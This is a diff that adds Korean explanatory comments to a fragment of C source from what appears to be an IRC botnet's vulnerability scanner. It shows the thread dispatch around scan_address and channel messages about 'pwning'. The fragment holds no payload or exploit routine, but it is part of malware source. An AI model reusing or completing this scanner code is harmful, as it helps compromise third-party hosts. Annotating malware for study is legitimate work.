@@ -25,6 +25,7 @@ int cmd_advscan_join(char *addr, sock_t *sp, requests_t *req,
 
 /* cmd_scan_central(sock_t *, requests_t *, unsigned short) */ 
 /* start scanner with vuln type.  */ 
+/* requests_t의 값을 scan_data에 집어넣어 해당 값을 매개변수로 scan_address를 쓰레드를 만들어 실행한다 */
 void cmd_scan_central(sock_t *sp, requests_t *req, unsigned short type) {
     unsigned short a, b, c;
     int i, x;
@@ -63,9 +64,11 @@ void cmd_scan_central(sock_t *sp, requests_t *req, unsigned short type) {
         for (x = 0; x < maxthreads; x++, i++) {
             if (strlen(hosts[i]) < 7) break;
 
+			/* scan_data.hostname에 hosts의 값을 저장한다 */
             memset(scan_data[x].hostname, 0, sizeof(scan_data[x].hostname));
             snprintf(scan_data[x].hostname, 31, "%s", hosts[i]);
 
+			/* 쓰레드를 만들어 scan_address를 돌린다. 생성이 안될시 crash로 이동 */
             if (pthread_create(&pthds[x], NULL, (void *)&scan_address, (scan_data_t *) & scan_data[x]) != 0) {
                 if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[crash] scanner has crashed, continuing to pwning..\n", channel);
                 goto crash;
@@ -75,6 +78,7 @@ void cmd_scan_central(sock_t *sp, requests_t *req, unsigned short type) {
         for (x = 0; x < maxthreads; x++) {
             if (strlen(hosts[i]) < 7) break;
             
+			/* 위의 쓰레드가 정상적으로 종료 되지 않을경우 crash로 이동 */
             if (pthread_join(pthds[x], NULL) != 0) {
                 if (all_messages) sockwrite(sp->sockfd, "PRIVMSG %s :[crash] scanner has crashed, continuing to pwning..\n", channel);
                 goto crash;
